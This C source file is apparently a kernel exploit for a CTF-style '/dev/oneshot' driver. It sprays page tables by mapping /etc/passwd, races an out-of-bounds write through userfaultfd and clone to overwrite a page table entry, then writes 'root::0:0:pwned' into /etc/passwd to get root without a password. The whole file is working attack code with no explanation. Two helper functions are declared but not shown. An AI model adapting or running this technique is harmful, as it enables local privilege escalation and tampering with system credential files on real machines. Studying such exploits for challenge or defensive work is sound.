#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sched.h>
#include <setjmp.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/wait.h>

int prepare_uffd(void *pages, int memsize);
void handle_uf(int ufd, void *target, void (*callback)(), char *oob_buf);

int oneshot_fd;
sigjmp_buf point;

void segv_handler(int sig, siginfo_t *info, void *ucontext) {
  longjmp(point, 1);
}

void setup_segfault_handler() {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sigaction));
  sigemptyset(&sa.sa_mask);

  sa.sa_flags     = SA_NODEFER;
  sa.sa_sigaction = segv_handler;

  sigaction(SIGSEGV, &sa, NULL);
}

/* should hang on page read */
int oob_write(void *pages) {
  write(oneshot_fd, pages, 0);
  return 0;
}

void last_write() {
  write(oneshot_fd, "g00d", 0);
}

void trigger() {
  void *pages = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
  if (pages == MAP_FAILED || pages != (void *)0x1337000) {
    perror("mmap");
    exit(-1);
  }

  int uffd = prepare_uffd(pages, 0x1000);
  printf("[+] uffd: %d\n", uffd);

  void *stack = malloc(0x10000);
  if (!stack) {
    perror("malloc");
    exit(-1);
  }

  clone(oob_write, stack + 0x10000, CLONE_VM|CLONE_FILES|SIGCHLD, pages);

  /* handle page fault */
  char *oob_buf = malloc(0x1000);
  oob_buf[0] = 0x27; /* overwrite PTE */
  handle_uf(uffd, pages, last_write, oob_buf);

  wait(NULL);
}

int main() {
  char *addr = (char *)0x200000000000;
  int vuln_fd = open("/etc/passwd", O_RDONLY);
  if (vuln_fd < 0) {
    perror("Open failed: ");
    exit(-1);
  }

  oneshot_fd = open("/dev/oneshot", O_RDWR);
  if (oneshot_fd < 0) {
    perror("Open oneshot failed: ");
    exit(-1);
  }

  /* allocate size 0x10000 which is bigger than the largest kmem_cache size (8K)
   * wait for any page table got sprayed after it */
  write(oneshot_fd, "A", 0x10000);

  for (int i = 0; i < 300; ++i) {
    /* pre-populate the page table */
    void *p = mmap(addr + i * 0x200000, 0x1000, PROT_READ, MAP_SHARED | MAP_POPULATE, vuln_fd, 0);
    if (p == MAP_FAILED) {
      perror("Mmap failed: ");
      exit(-1);
    }
  }

  for (int i = 0; i < 0xfffe; ++i) {
    write(oneshot_fd, "A", 0);
  }

  trigger();
  setup_segfault_handler();

  for (int i = 0; i < 300; ++i) {
    char *target = addr + i * 0x200000;
    if (setjmp(point) == 0) {
      /* may cause segfault */
      target[0] = 'A';

      /* successfully overwrite passwd */
      memcpy(target, "root::0:0:pwned", 15);
      printf("[+] succeed on idx %d!\n", i);
    }
  }
}
